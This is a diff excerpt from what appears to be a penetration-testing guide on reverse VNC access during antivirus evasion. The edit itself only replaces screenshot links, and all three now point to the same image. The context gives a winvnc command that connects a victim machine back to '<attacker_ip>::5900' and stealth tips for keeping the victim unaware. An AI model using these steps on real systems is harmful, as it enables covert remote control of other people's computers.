@@ -39,9 +39,9 @@ The **attacker** should **execute inside** his **host** the binary `vncviewer.ex
 Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
 **WARNING:** To maintain stealth you must not do a few things
-- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
-- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
-- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)
+- Don't start `winvnc` if it's already running or you'll trigger a [popup](.gitbook/assets/1663772460.png). check if it's running with `tasklist | findstr winvnc`
+- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](.gitbook/assets/1663772460.png) to open
+- Don't run `winvnc -h` for help or you'll trigger a [popup](.gitbook/assets/1663772460.png)
 
 ## GreatSCT
 
